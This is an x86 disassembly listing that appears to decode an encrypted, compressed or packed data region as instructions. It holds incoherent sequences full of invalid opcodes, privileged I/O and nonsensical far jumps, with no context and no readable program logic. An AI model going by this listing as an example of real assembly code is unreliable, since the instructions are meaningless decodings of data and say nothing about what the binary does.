  41811d:	fdiv   DWORD PTR [esi-0x4c416551]
  418123:	dec    edi
  418124:	aaa    
  418125:	and    ebx,DWORD PTR [esi+0x68]
  418128:	repnz (bad) 
  41812b:	xchg   esi,eax
  41812c:	shl    bh,1
  41812e:	adc    al,0x67
  418130:	outs   dx,BYTE PTR ds:[esi]
  418131:	int3   
  418132:	scas   eax,DWORD PTR es:[edi]
  418133:	jno    0x4180e4
  418135:	mov    dl,0x77
  418137:	sar    DWORD PTR [ecx],0x9a
  41813a:	and    BYTE PTR [edx+0x1d350d5d],ah
  418140:	lods   eax,DWORD PTR ds:[esi]
  418141:	cwde   
  418142:	clc    
  418143:	dec    edi
  418144:	and    eax,0x229a63d7
  418149:	add    DWORD PTR [esp+edx*2-0x5],esi
  41814d:	rol    al,1
  41814f:	mov    esp,0x14cb12a9
  418154:	mov    eax,0x397a3fe0
  418159:	xchg   ebx,eax
  41815a:	push   cs
  41815b:	or     dh,BYTE PTR [ebp+0x786c2828]
  418161:	nop
  418162:	mov    dl,BYTE PTR [edx]
  418164:	fld    QWORD PTR [edx-0x17771515]
  41816a:	inc    edi
  41816b:	cmp    eax,0x455bade7
  418170:	and    eax,0x5ada774d
  418175:	test   al,0xaa
  418177:	test   DWORD PTR [edi],0xc9c250fd
  41817d:	test   al,0x2e
  41817f:	mov    eax,0x77e9c57f
  418184:	sub    al,0x9f
  418186:	dec    esp
  418187:	mov    BYTE PTR [esi+ebx*4-0x3b359bb6],bh
  41818e:	xlat   BYTE PTR ds:[ebx]
  41818f:	and    eax,edx
  418191:	(bad)  
  418192:	stos   DWORD PTR es:[edi],eax
  418193:	aas    
  418194:	scas   al,BYTE PTR es:[edi]
  418195:	in     eax,0x2b
  418197:	jb     0x4181ad
  418199:	and    eax,0xca4ccf90
  41819e:	dec    edx
  41819f:	(bad)
  4181a2:	mov    edx,0x952b5ce8
  4181a7:	aam    0x53
  4181a9:	xchg   BYTE PTR [edx-0x64],ah
  4181ac:	rcr    DWORD PTR [eax+edi*4-0x538a8255],1
  4181b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b4:	call   0xa2cf:0x774825ab
  4181bb:	scas   al,BYTE PTR es:[edi]
  4181bc:	js     0x418189
  4181be:	fbld   TBYTE PTR [esi+edi*4]
  4181c1:	jne    0x41819c
  4181c3:	in     eax,0x31
  4181c5:	pop    eax
  4181c6:	int    0x6c
  4181c8:	aas    
  4181c9:	das    
  4181ca:	mov    al,ds:0xe41d8aa9
  4181cf:	ret    
  4181d0:	das    
  4181d1:	arpl   WORD PTR [esi+0x68],bx
  4181d4:	test   BYTE PTR [esi+eiz*8+0x658ba4a2],cl
  4181db:	push   ebx
  4181dc:	ss cmp al,0xec
  4181df:	jb     0x4181b7
  4181e1:	out    0xd6,al
  4181e3:	mov    esi,0x73ab66f4
  4181e8:	ror    dh,cl
  4181ea:	shl    DWORD PTR ds:0xb7490fd6,1
  4181f0:	fstp   TBYTE PTR [esi-0x77]
  4181f3:	leave  
  4181f4:	xor    eax,0x95b8233b
  4181f9:	xchg   edi,ebx
  4181fb:	(bad)  
  4181fc:	bound  ebp,QWORD PTR [edx]
  4181fe:	cwde   
  4181ff:	or     edx,DWORD PTR [edi+0x642520d6]
  418205:	push   ds
  418206:	pop    ds
  418207:	sti    
  418208:	ins    DWORD PTR es:[edi],dx
  418209:	std    
  41820a:	pusha  
  41820b:	test   BYTE PTR [eax-0xe],bl
  41820e:	pop    ecx
  41820f:	cdq    
  418210:	in     eax,0xe9
  418212:	stos   DWORD PTR es:[edi],eax
  418213:	es dec al
  418216:	xchg   ebx,eax
  418217:	imul   eax,DWORD PTR [eax+0x59],0xe213d2ed
  41821e:	sbb    ecx,DWORD PTR [ebx-0x54a468a5]
  418224:	cmp    al,0x20
  418226:	(bad)  
  418227:	repz or cl,dh
  41822a:	adc    al,0xed
  41822c:	jecxz  0x4181df
  41822e:	or     eax,0xf76a664
  418233:	enter  0x7235,0xcc
  418237:	sbb    dl,BYTE PTR [eax+0x155ba64]
  41823d:	imul   edx,DWORD PTR [esi+edx*4-0x3649d337],0x1a63ff7d
  418248:	sahf   
  418249:	dec    esp
  41824a:	rol    BYTE PTR [ecx-0x39],cl
  41824d:	dec    eax
  41824e:	jecxz  0x418288
  418250:	pop    ds
  418251:	xchg   ecx,eax
  418252:	fidiv  WORD PTR [esi+0xde08a7f]
  418258:	add    ebp,DWORD PTR [ebx-0x43]
  41825b:	(bad)  [edi+0x3e]
  41825f:	mov    edi,0xa8892276
  418264:	xor    eax,0x375312e7
  418269:	inc    edx
  41826a:	lds    esp,FWORD PTR [esi]
  41826c:	lds    esp,FWORD PTR [eax-0x65]
  41826f:	in     eax,dx
  418270:	mov    eax,0x742ad2a6
  418275:	scas   eax,DWORD PTR es:[edi]
  418276:	xchg   ecx,edx
  418278:	add    ecx,DWORD PTR [ebx+0x5a6a5e4]
  41827e:	adc    DWORD PTR [ecx],esp
  418280:	int    0x7a
  418282:	fimul  WORD PTR [ecx+edi*8]
  418285:	jmp    0xdaede0d7
  41828a:	inc    ebp
  41828b:	inc    esp
  41828c:	jbe    0x418298
  41828e:	mov    edx,0x6ee7fd1f
  418293:	jmp    DWORD PTR [edx-0x63]
  418296:	mov    esi,ebx
  418298:	inc    esi
  418299:	dec    ebp
  41829a:	push   eax
  41829c:	repnz fisubr WORD PTR [ecx+0xa90f001]
  4182a3:	ret    
  4182a4:	cmp    eax,0xe6114a5b
  4182a9:	scas   al,BYTE PTR es:[edi]
  4182aa:	mov    al,0x79
  4182ac:	xchg   DWORD PTR [esi+0x8],ebx
  4182af:	xchg   esi,eax
  4182b0:	fucomp st(3)
  4182b3:	adc    eax,0xbd14890b
  4182b8:	xchg   ebx,eax
  4182b9:	addr16 dec ebx
  4182bb:	jge    0x418298
  4182bd:	call   0x7a0a:0xfae0f0ce
  4182c4:	enter  0x7857,0x4d
  4182c8:	cmp    esi,edx
  4182ca:	jne    0x4182f8
  4182cc:	push   cs
  4182cd:	fldz   
  4182cf:	jmp    0xd1b5c543
  4182d4:	xchg   ebx,eax
  4182d5:	push   eax
  4182d6:	or     edi,DWORD PTR [edi+0x2ed59562]
  4182dc:	(bad)  
  4182dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182de:	push   ebp
  4182df:	ja     0x41833c
  4182e1:	fild   DWORD PTR [edi]
  4182e3:	sbb    eax,0x46b790fd
  4182e8:	icebp  
  4182e9:	gs nop
  4182eb:	inc    ecx
  4182ec:	inc    eax
  4182ed:	call   0xf3b7:0xd052df5
  4182f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182f5:	pop    edi
  4182f6:	mov    ds:0xda0cd958,eax
  4182fb:	in     al,0x38
  4182fd:	hlt    
  4182fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ff:	bound  esp,QWORD PTR [edx+0x27]
  418302:	mov    edi,0xde6ca0d8
  418307:	std    
  418308:	cmp    al,0x78
  41830a:	call   0x4e50:0x76543838
  418311:	into   
  418312:	jo     0x4182c5
  418314:	ins    DWORD PTR es:[edi],dx
  418315:	sti    
  418316:	sub    eax,0x51f7f15d
  41831b:	dec    ebx
  41831c:	(bad)  
  41831d:	sar    BYTE PTR [edi+ebx*8],0x80
  418321:	mov    eax,ds:0xc7d83cc9
  418326:	add    BYTE PTR [eax+0x5e],0x50
  41832a:	icebp  
  41832b:	arpl   WORD PTR [edx-0x660e53b7],sp
  418331:	int3   
  418332:	xchg   ebx,eax
  418333:	or     al,0x89
  418335:	mov    eax,0xbfb4f59e
  41833a:	jmp    0x418366
  41833c:	imul   edi,DWORD PTR [ecx-0xfb5e2d9],0x1be6be54
  418346:	fdivr  DWORD PTR ds:0xa76bac1a
  41834c:	push   es
  41834d:	xor    DWORD PTR [esi+ebp*8-0x45],eax
  418351:	call   0x36cc6f68
  418356:	jne    0x418334
  418358:	mov    ds:0xe519de80,al
  41835d:	or     BYTE PTR [edx-0x61e50585],dh
  418363:	dec    ebp
  418364:	inc    ebx
  418365:	daa    
  418366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418367:	push   cs
  418368:	out    dx,al
  418369:	cs mov esp,0x9b394b7f
  41836f:	int3   
  418370:	cdq    
  418371:	inc    edi
  418372:	jnp    0x41836f
  418374:	push   edx
  418375:	xor    BYTE PTR [eax],bl
  418377:	mov    cl,bh
  418379:	lea    esp,ds:0x55d0478b
  41837f:	jne    0x418301
  418381:	outs   dx,DWORD PTR ds:[esi]
  418382:	jecxz  0x4183b8
  418384:	pop    esi
  418385:	aam    0xc9
  418387:	xchg   edx,esp
  418389:	dec    eax
  41838a:	mov    al,ds:0xc8c13c65
  41838f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418390:	push   0xebb423c1
  418395:	(bad)  
  418396:	bnd jae 0x4183c6
  418399:	cmc    
  41839a:	fucomip st,st(0)
  41839c:	push   0x30f8067c
  4183a1:	ret    0xb9c5
  4183a4:	in     eax,dx
  4183a5:	cmp    eax,0xde3a105d
  4183aa:	into   
  4183ab:	aad    0xc6
  4183ad:	leave  
  4183ae:	psrad  mm2,0x2c
  4183b2:	cli    
  4183b3:	push   ebx
  4183b4:	cli    
  4183b5:	outs   dx,DWORD PTR ds:[esi]
  4183b6:	lahf   
  4183b7:	pop    esp
  4183b8:	jb     0x418382
  4183ba:	jle    0x418383
  4183bc:	lahf   
  4183bd:	sub    DWORD PTR [edx+0xe],edx
  4183c0:	mov    es,WORD PTR [ebx-0x57f2c23c]
  4183c6:	and    al,0x91
  4183c8:	rol    DWORD PTR [eax+0x22],cl
  4183cb:	inc    esi
  4183cc:	mov    esi,0x467ae69b
  4183d1:	mov    bh,0x4b
  4183d3:	adc    ah,BYTE PTR [edi-0x101c4853]
  4183d9:	inc    ebx
  4183da:	sti    
  4183db:	jne    0x4183fc
  4183dd:	pushf  
  4183de:	shl    esi,cl
  4183e0:	int    0xba
  4183e2:	jae    0x4183c5
  4183e4:	mov    dl,BYTE PTR [esi+eiz*2+0x30594c5f]
  4183eb:	xor    al,0xcf
  4183ed:	imul   ecx,DWORD PTR [edx+ebx*2],0x8a12982c
  4183f4:	push   edi
  4183f5:	jns    0x4183ac
  4183f7:	inc    eax
  4183f8:	enter  0xf782,0xc9
  4183fc:	push   cs
  4183fd:	ds adc edi,esi
  418400:	inc    eax
  418401:	fwait
  418402:	push   ecx
  418403:	sub    esi,ebx
  418405:	int    0x3e
  418407:	sub    ebp,esi
  418409:	(bad)  
  41840a:	push   edi
  41840b:	out    dx,eax
  41840c:	stc    
  41840d:	xor    al,0xc7
  41840f:	dec    esp
  418410:	scas   al,BYTE PTR es:[edi]
  418411:	test   eax,0xc8bc883
  418416:	lods   eax,DWORD PTR ds:[esi]
  418417:	mov    ecx,DWORD PTR [esi]
  418419:	fwait
  41841a:	gs cmp al,0xf1
  41841d:	gs mov edx,0xc580fd7d
  418423:	mov    edx,0x1a83d7f5
  418428:	lods   al,BYTE PTR ds:[esi]
  418429:	sti    
  41842a:	and    eax,0x8e176cab
  41842f:	mov    ds:0x6f7636fc,al
  418434:	lock lods eax,DWORD PTR ds:[esi]
  418436:	add    edx,DWORD PTR [ecx]
  418438:	adc    al,0x74
  41843a:	fadd   QWORD PTR [ebp-0x68]
  41843d:	add    DWORD PTR [ecx+ebx*2+0x69f06861],ebp
  418444:	pop    esi
  418445:	or     DWORD PTR [ecx],esp
  418447:	in     al,dx
  418448:	in     eax,0xf3
  41844a:	outs   dx,DWORD PTR ds:[esi]
  41844b:	xor    eax,0xdb4402a2
  418450:	push   ss
  418451:	sub    eax,0x355ee13e
  418456:	out    0x51,al
  418458:	popf   
  418459:	push   0x80121fb4
  41845e:	push   es
  41845f:	mov    cl,0x1e
  418461:	(bad)  
  418462:	call   0x8e17:0x79d3f15a
  418469:	jp     0x418408
  41846b:	jg     0x418457
  41846d:	ret    0xc5c
  418470:	xchg   esp,eax
  418471:	pop    esp
  418472:	repnz xchg ebx,eax
  418474:	ins    DWORD PTR es:[edi],dx
  418475:	add    ebx,DWORD PTR [eax]
  418477:	call   FWORD PTR [edx]
  418479:	ss xchg edi,eax
  41847b:	aad    0xe6
  41847d:	push   ss
  41847e:	cli    
  41847f:	in     eax,0x76
  418481:	jmp    0xa29b:0x190d1261
  418488:	shr    DWORD PTR [edi-0x5c],0x4d
  41848c:	cmp    eax,0xc5e6efe8
  418491:	and    al,0x12
  418493:	xor    ebp,DWORD PTR [ebx-0x7d]
  418496:	mov    cl,0xb1
  418498:	loope  0x418478
  41849a:	sub    al,0x59
  41849c:	mov    dl,0xd
  41849e:	pop    esi
  41849f:	dec    esp
  4184a0:	xor    dh,cl
  4184a2:	xchg   ecx,esp
  4184a4:	sub    esi,DWORD PTR [ebx+ebp*4]
  4184a7:	les    ebp,FWORD PTR [ebx-0x21591d5d]
  4184ad:	xor    BYTE PTR ds:0x4696d2,al
  4184b3:	out    0x29,eax
  4184b5:	in     eax,0x45
  4184b7:	sub    eax,0x7839b588
  4184bc:	imul   esi,DWORD PTR [edx],0x8874e52
  4184c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c3:	loope  0x4184f9
  4184c5:	nop
  4184c6:	mov    ds:0x2da6a81e,eax
  4184cb:	xor    al,0x96
  4184cd:	xchg   ebp,eax
  4184ce:	jecxz  0x418509
  4184d0:	jecxz  0x4184e0
  4184d2:	ss mov edx,0xb942f427
  4184d8:	out    0x8e,al
  4184da:	add    esp,DWORD PTR [edx+0x5a]
  4184dd:	out    0x88,eax
  4184df:	loop   0x418532
  4184e1:	in     al,0x60
  4184e3:	outs   dx,BYTE PTR ds:[esi]
  4184e4:	mov    edx,DWORD PTR [ecx]
  4184e6:	std    
  4184e7:	jge    0x4184b3
  4184e9:	jae    0x418471
  4184eb:	pop    edi
  4184ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184ed:	loope  0x41856a
  4184ef:	aam    0xb3
  4184f1:	imul   esp,ebx,0xffffffff
  4184f4:	int    0xb5
  4184f6:	imul   edx,DWORD PTR [edx],0x89059728
  4184fc:	div    DWORD PTR [ecx]
  4184fe:	dec    edx
  4184ff:	jge    0x418558
  418501:	add    eax,0x7229541c
  418506:	inc    edi
  418507:	stos   DWORD PTR es:[edi],eax
  418508:	adc    eax,0xfe0f01a7
  41850d:	or     eax,0xe2d3503b
  418512:	jmp    DWORD PTR [ecx+0x3b5c042a]
  418518:	mov    cl,BYTE PTR [edx]
  41851a:	repnz xchg dx,ax
  41851d:	xor    ch,BYTE PTR [ebp+eiz*2+0x28ff60ba]
  418524:	fwait
  418525:	aad    0xeb
  418527:	outs   dx,BYTE PTR ds:[esi]
  418528:	mov    ds:0x3d4aa72b,eax
  41852d:	fdiv   st,st(1)
  41852f:	mov    al,ds:0x181869ca
  418534:	sbb    esp,DWORD PTR [ebp+0x6bb4165a]
  41853a:	mov    dl,0x84
  41853c:	outs   dx,BYTE PTR ds:[esi]
  41853d:	enter  0x795d,0x43
  418541:	xchg   edi,eax
  418542:	inc    esp
  418543:	fs mov cl,0xf7
  418546:	mov    edx,0x65b90dc1
  41854b:	lods   eax,DWORD PTR ds:[esi]
  41854c:	retf   0x6d31
  41854f:	and    eax,0x20221472
  418554:	inc    edi
  418555:	jo     0x418587
  418557:	(bad)  
  418559:	jmp    FWORD PTR [ecx-0x29]
  41855c:	sar    BYTE PTR [edx],0x8d
  41855f:	adc    esi,DWORD PTR [ebp+0x46]
  418562:	pop    esp
  418563:	mov    ds:0x8d6390c7,eax
  418568:	cmp    bh,BYTE PTR [eax+0x45]
  41856b:	outs   dx,DWORD PTR ds:[esi]
  41856c:	adc    eax,0xf43e9b8f
  418571:	cli    
  418572:	outs   dx,DWORD PTR ds:[esi]
  418573:	daa    
  418574:	mov    ebp,0x85e232ff
  418579:	xchg   esi,eax
  41857a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41857b:	add    DWORD PTR [edi],eax
  41857d:	adc    DWORD PTR [ebp+edx*1+0x39],ebp
  418581:	xchg   ebx,eax
  418582:	or     BYTE PTR [ebx-0x2e553be1],dh
  418588:	or     DWORD PTR [ebx-0x61],esp
  41858b:	(bad)  [ebp-0x312036c8]
  418591:	out    0xf3,eax
  418593:	add    BYTE PTR [ebx-0x522b916d],al
  418599:	std    
  41859a:	gs cli 
  41859c:	xchg   edx,eax
  41859d:	cmp    al,0xa8
  41859f:	inc    ebp
  4185a0:	imul   DWORD PTR [eax-0x7bdebf1e]
  4185a6:	mov    ds:0xa22ae9d3,eax
  4185ab:	mov    ds:0x13096c70,al
  4185b0:	ret    
  4185b1:	xor    bl,BYTE PTR [ebp+0x7f]
  4185b4:	or     DWORD PTR [esi-0x54],0xa9b24ac5
  4185bb:	out    dx,al
  4185bc:	in     eax,dx
  4185bd:	xchg   BYTE PTR [ebx-0x5],dl
  4185c0:	adc    eax,0x420ec3a8
  4185c5:	call   0x58df4ba2
  4185ca:	mov    esp,0x6c18eb20
  4185cf:	mov    esi,0x128eeb20
  4185d4:	ret    0xc701
  4185d7:	lds    edx,FWORD PTR [eax+0x5d]
  4185da:	bound  edi,QWORD PTR [edi-0x3327d71b]
  4185e0:	xor    eax,edx
  4185e2:	dec    eax
  4185e3:	sti    
  4185e4:	popf   
  4185e5:	push   ebp
  4185e6:	mov    eax,0xd42ea90e
  4185eb:	test   ch,al
  4185ed:	cmp    al,BYTE PTR [ebp-0x2d6074b6]
  4185f3:	iret   
  4185f4:	pop    edx
  4185f5:	mov    DWORD PTR [edi-0x6d27413a],edi
  4185fb:	rcl    bh,cl
  4185fd:	and    bh,ch
  4185ff:	fidiv  WORD PTR [ebx-0x2123eb83]
  418605:	mov    bh,0x33
  418607:	mov    bh,0x7c
  418609:	lock aas 
  41860b:	ins    DWORD PTR es:[edi],dx
  41860c:	bound  edx,QWORD PTR [edi+eiz*1+0xbe359db]
  418613:	out    0xdd,al
  418615:	and    BYTE PTR [eax],0x2c
  418618:	xor    ebx,DWORD PTR [eax]
  41861a:	inc    ebx
  41861b:	daa    
  41861c:	outs   dx,DWORD PTR ds:[esi]
  41861d:	aam    0xa1
  41861f:	push   esi
  418620:	sbb    eax,0x65de9cb1
  418625:	sub    esp,DWORD PTR [edx+0x3f]
  418628:	xor    eax,DWORD PTR [edi+0x3207f16d]
  41862e:	shl    al,cl
  418630:	push   ebp
  418631:	or     BYTE PTR ss:[ebp-0x72],bh
  418635:	scas   al,BYTE PTR es:[edi]
  418636:	sbb    dl,al
  418638:	push   0x7c8d41e
  41863d:	cmp    DWORD PTR [edi],eax
  41863f:	rol    DWORD PTR [edx-0x25],1
  418642:	sub    al,0x98
  418644:	jge    0x4185e0
  418646:	pop    ebp
  418647:	xchg   esi,eax
  418648:	addr16 sbb al,ch
  41864b:	mov    ebp,0x25d435a7
  418650:	push   0xffffff94
  418652:	adc    esi,ebx
  418654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418655:	push   esi
  418656:	ss mov al,0x21
  418659:	add    edi,eax
  41865b:	leave  
  41865c:	retf   0x9b3d
  41865f:	fwait
  418660:	into   
  418661:	(bad)  
  418662:	shr    BYTE PTR [ebx],1
  418664:	xchg   esi,eax
  418665:	and    DWORD PTR ds:0xfef5a7a2,ebp
  41866b:	adc    DWORD PTR [eax+0x532e11ac],ebx
  418671:	pushf  
  418672:	add    dl,cl
  418674:	iret   
  418675:	mov    al,0xb
  418677:	add    BYTE PTR [ebx+0x49],ah
  41867a:	scas   al,BYTE PTR es:[edi]
  41867b:	fwait
  41867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867d:	retf   
  41867e:	out    dx,eax
  41867f:	mov    ds:0x22c8409a,eax
  418684:	and    ebx,DWORD PTR [eax-0x27]
  418687:	leave  
  418688:	pop    es
  418689:	inc    edi
  41868a:	adc    esp,DWORD PTR [esi+esi*1]
  41868d:	nop    DWORD PTR [esi-0x5d]
  418691:	adc    ecx,DWORD PTR [eax]
  418693:	and    ah,al
  418695:	pop    ds
  418696:	add    ch,ah
  418698:	jle    0x4186ba
  41869a:	xor    DWORD PTR [edi+edi*2],ebp
  41869d:	fwait
  41869e:	add    DWORD PTR [esi-0x6f],esp
  4186a1:	mov    ds:0xf99b62ed,eax
  4186a6:	adc    ah,BYTE PTR [ebx+0x61811a8c]
  4186ac:	sbb    al,BYTE PTR [esi+0x1fbf9b29]
  4186b2:	les    ecx,FWORD PTR [edi-0x1df0082d]
  4186b8:	and    BYTE PTR [bx+0x50],0x9a
  4186bd:	ins    BYTE PTR es:[edi],dx
  4186be:	add    al,BYTE PTR ds:0x9a63275
  4186c4:	bound  edi,QWORD PTR [ecx-0x61340ef8]
  4186ca:	xor    eax,0xaa102844
  4186cf:	xor    bh,ch
  4186d1:	jae    0x41872e
  4186d3:	mov    eax,0xf233870b
  4186d8:	adc    eax,0xa72c8f85
  4186dd:	es fwait
  4186df:	push   ebx
  4186e0:	xchg   ebx,eax
  4186e1:	mov    bl,0xf1
  4186e3:	push   ecx
  4186e4:	cmp    ah,BYTE PTR [esi+ebx*8]
  4186e7:	add    al,BYTE PTR [esi-0x2bb81109]
  4186ed:	fisubr DWORD PTR [ecx+0x329e433e]
  4186f3:	popf   
  4186f4:	jb     0x41868e
  4186f6:	mov    cl,0xa1
  4186f8:	inc    edi
  4186f9:	mov    dl,0x79
  4186fb:	fstp   DWORD PTR [eax]
  4186fd:	inc    ecx
  4186fe:	sbb    DWORD PTR [esi+0x25],esi
  418701:	jp     0x4186f1
  418703:	mov    esp,0x6e2d0e16
  418708:	das    
  418709:	inc    esp
  41870a:	inc    eax
  41870b:	cdq    
  41870c:	stc    
  41870d:	push   0xa
  41870f:	jbe    0x4186c4
  418711:	ds pop ebx
  418713:	mov    dh,0xb4
  418715:	mov    esp,DWORD PTR [ebx+0x5ee0e751]
  41871b:	ins    BYTE PTR es:[edi],dx
  41871c:	xor    DWORD PTR [esi],ecx
  41871e:	pop    es
  41871f:	ror    edi,0x61
  418722:	mov    eax,ds:0x25d90d3
  418727:	pop    ebx
  418728:	jl     0x4186d0
  41872a:	mul    esp
  41872c:	std    
  41872d:	jp     0x4186d9
  41872f:	jne    0x418717
  418731:	call   0x7d72:0x656173e0
  418738:	dec    esp
  418739:	(bad)  
  41873a:	sub    eax,0x88c57eb8
  41873f:	(bad)  
  418740:	stos   BYTE PTR es:[edi],al
  418741:	jp     0x41871d
  418743:	jbe    0x418773
  418745:	jle    0x4187bc
  418747:	cmp    bl,BYTE PTR [ecx-0x41]
  41874a:	jne    0x41876e
  41874c:	dec    ebp
  41874d:	ins    DWORD PTR es:[edi],dx
  41874e:	mov    ch,0x46
  418750:	je     0x4187b5
  418752:	sub    eax,0xb8032f2c
  418757:	lahf   
  418758:	mov    eax,0x4c91b04d
  41875d:	inc    edx
  41875e:	sbb    ecx,DWORD PTR [eax+0x492005ea]
  418764:	mov    ecx,DWORD PTR [esp+ebp*1-0x568fb49c]
  41876b:	adc    esp,esi
  41876d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41876e:	inc    edi
  41876f:	adc    edx,ebx
  418771:	push   eax
  418772:	sti    
  418773:	jbe    0x41879a
  418775:	outs   dx,BYTE PTR ds:[esi]
  418776:	mov    al,0x89
  418778:	sub    cl,ch
  41877a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41877b:	xor    al,0x26
  41877d:	outs   dx,DWORD PTR ds:[esi]
  41877e:	aad    0xca
  418780:	test   eax,0x1ed306e5
  418785:	dec    esi
  418786:	(bad)
  41878b:	in     al,0x34
  41878d:	addr16 mov ebx,0x32d5c644
  418793:	aam    0x6c
  418795:	push   0xffffffba
  418797:	fwait
  418798:	xchg   ecx,eax
  418799:	add    BYTE PTR [ecx+0x161f1e13],dl
  41879f:	out    0x87,al
  4187a1:	inc    esi
  4187a2:	mov    fs,WORD PTR [ebx-0xe8ccf01]
  4187a8:	fs int3 
  4187aa:	(bad)  
  4187ab:	sti    
  4187ac:	mov    al,ds:0x56862045
  4187b1:	ret    
  4187b2:	jbe    0x4187ed
  4187b4:	mov    bl,0xa6
  4187b6:	imul   ecx,DWORD PTR [edi],0x46
  4187b9:	fadd   QWORD PTR [edx]
  4187bb:	mov    ebx,0xd90539b6
  4187c0:	shl    DWORD PTR [ecx-0x20d2c028],cl
  4187c6:	add    ebx,edi
  4187c8:	and    ebx,0x89992fb6
  4187ce:	lods   eax,DWORD PTR ds:[esi]
  4187cf:	popf   
  4187d0:	test   al,0xe6
  4187d2:	(bad)  
  4187d3:	fnsave [edx]
  4187d5:	pushf  
  4187d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187d7:	lods   eax,DWORD PTR ds:[esi]
  4187d8:	lock mov ecx,ss
  4187db:	call   0x221af394
  4187e0:	cwde   
  4187e1:	xor    DWORD PTR ds:0xe7b3b6f3,esi
  4187e7:	inc    ecx
  4187e8:	loopne 0x41878a
  4187ea:	xor    al,0xae
  4187ec:	push   ebp
  4187ed:	xor    edi,DWORD PTR [esi+0x2e6fb4f2]
  4187f3:	sbb    eax,DWORD PTR [edi]
  4187f5:	mov    dh,0xcf
  4187f7:	out    dx,eax
  4187f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187f9:	inc    ebp
  4187fa:	xchg   esp,eax
  4187fb:	fs jb  0x41881a
  4187fe:	jae    0x4187a1
  418800:	sbb    BYTE PTR [esi-0x7b4d2966],cl
  418806:	or     ebp,DWORD PTR [esi]
  418808:	push   es
  418809:	and    DWORD PTR [esp+eiz*2],ebx
  41880c:	push   edx
  41880d:	cmp    ebx,ebx
  41880f:	dec    eax
  418810:	cmp    dl,BYTE PTR [ebx-0x563b2cd5]
  418816:	aaa    
  418817:	inc    ebp
  418818:	test   eax,0x616499d1
  41881d:	call   0x2e72:0xc2e4d029
  418824:	sbb    eax,0x39caeb8c
  418829:	push   ebp
  41882a:	or     dl,BYTE PTR [ecx-0x23]
  41882d:	stos   DWORD PTR es:[edi],eax
  41882e:	xor    al,0xf1
  418830:	push   ss
  418831:	cmc    
  418832:	push   esi
  418833:	js     0x4187b9
  418835:	repnz or al,BYTE PTR [ebp+0x52]
  418839:	sar    bl,cl
  41883b:	in     al,dx
  41883c:	pop    ecx
  41883d:	jnp    0x41889a
  41883f:	mov    ?,WORD PTR [edi+0x7a76c56a]
  418845:	mov    al,ds:0x97e57d27
  41884a:	fstp   DWORD PTR [edx-0x9ebe802]
  418850:	test   DWORD PTR [ebx-0x4d],esp
  418853:	xchg   esi,eax
  418854:	jmp    0xf133:0x773ddd44
  41885b:	aam    0xdc
  41885d:	jecxz  0x41888e
  41885f:	popf   
  418860:	or     DWORD PTR [edi+0x54],0xb028efe1
  418867:	sub    eax,DWORD PTR [esi]
  418869:	push   ds
  41886a:	je     0x41883d
  41886c:	or     BYTE PTR [edx+0x16faa130],dh
  418872:	add    eax,0xbe2bad81
  418877:	loope  0x418827
  418879:	stc    
  41887a:	sbb    al,0x71
  41887c:	stos   BYTE PTR es:[edi],al
  41887d:	add    DWORD PTR [ebp-0xd7827d4],esi
  418883:	inc    esi
  418884:	inc    esi
  418885:	xor    eax,0xc0079879
  41888a:	and    al,0x6a
  41888c:	jns    0x41881c
  41888e:	(bad)
  418892:	sar    cl,1
  418894:	popa   
  418895:	arpl   WORD PTR [edx*1+0x13df74bf],bp
  41889c:	(bad)  
  41889d:	cmp    DWORD PTR [esi+edi*1],ebx
  4188a0:	aaa    
  4188a1:	adc    cl,BYTE PTR [eax+0x2c]
  4188a4:	mov    ss,WORD PTR ds:0x38a9ac5d
  4188aa:	movaps XMMWORD PTR [ecx],xmm7
  4188ad:	or     BYTE PTR [edi],0xe7
  4188b0:	lods   eax,DWORD PTR ds:[esi]
  4188b1:	and    BYTE PTR [esi-0x4f],ah
  4188b4:	loope  0x4188e0
  4188b6:	mov    BYTE PTR gs:[ecx],cl
  4188b9:	xor    ebx,DWORD PTR [eax+eiz*4]
  4188bc:	xor    DWORD PTR [edi],ebp
  4188be:	and    DWORD PTR [edx],ecx
  4188c0:	(bad)  [edx-0x12]
  4188c3:	push   0x2c
  4188c5:	adc    DWORD PTR ds:0xac95838d,esp
  4188cb:	popf   
  4188cc:	stos   DWORD PTR es:[edi],eax
  4188cd:	daa    
  4188ce:	(bad)  
  4188cf:	and    BYTE PTR [ebx],cl
  4188d1:	mov    WORD PTR ss:[edi+ecx*8],fs
  4188d5:	jmp    0xf172eae7
  4188da:	mov    al,ds:0x681fb1ce
  4188df:	mov    BYTE PTR [esi+0x7c7e5b11],ah
  4188e5:	std    
  4188e6:	sahf   
  4188e7:	sub    BYTE PTR [eax],0x2d
  4188ea:	fstp   DWORD PTR [edi+0x6d]
  4188ed:	pop    esp
  4188ee:	mov    ch,0x5f
  4188f0:	push   ebp
  4188f1:	and    al,0x6b
  4188f3:	jle    0x418948
  4188f5:	inc    ecx
  4188f6:	sub    DWORD PTR [esi],ebp
  4188f8:	adc    edi,DWORD PTR [edx+ebx*8+0x7d]
  4188fc:	mov    esi,0x5059b23d
  418901:	xor    edx,DWORD PTR [esi+0x7e60ae65]
  418907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418908:	test   al,0x76
  41890a:	out    dx,eax
  41890b:	scas   al,BYTE PTR es:[edi]
  41890c:	sbb    cl,BYTE PTR [eax]
  41890e:	(bad)  
  41890f:	(bad)  
  418911:	xchg   esp,eax
  418912:	adc    al,ah
  418914:	fsubr  DWORD PTR [ebx]
  418916:	xor    eax,0x5d8f8a0
  41891b:	std    
  41891c:	fwait
  41891d:	not    DWORD PTR [ebp-0x23b00ca4]
  418923:	pop    ds
